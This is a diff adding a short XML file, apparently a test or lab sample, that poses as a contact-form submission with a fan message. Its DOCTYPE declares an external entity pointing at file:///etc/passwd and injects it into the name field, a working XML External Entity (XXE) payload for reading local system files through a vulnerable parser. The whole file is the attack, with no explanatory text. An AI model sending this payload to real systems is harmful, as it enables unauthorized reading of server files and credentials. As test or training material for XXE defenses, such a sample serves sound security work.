@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<contact>
+<name>&xxe;</name>
+<email>RAFAEL@EXAMPLE.com</email>
+<subject>YOU ROCK</subject>
+<message>I LOVE WATCHING YOUR SKILLS, MAN</message>
+</contact>
